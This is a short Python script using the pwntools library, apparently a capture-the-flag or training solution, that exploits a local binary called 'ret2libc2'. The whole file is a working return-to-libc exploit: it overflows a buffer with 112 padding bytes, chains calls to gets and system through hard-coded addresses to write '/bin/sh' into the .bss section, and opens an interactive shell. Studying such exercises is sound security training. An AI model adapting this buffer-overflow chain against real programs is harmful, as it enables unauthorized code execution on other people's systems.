from pwn import *

sh=process("./ret2libc2")
system_plt= 0x08048490
gets_plt= 0x08048460
bss=0x0804A060
pop_ret=0x0804843d

sh.recvuntil(b"What do you think ?")
payload=b'A'*112 + p32(gets_plt) + p32(pop_ret) + p32(bss) + p32(system_plt) +p32(11) +p32(bss)
sh.sendline(payload)
sh.sendline(b'/bin/sh')
sh.interactive()
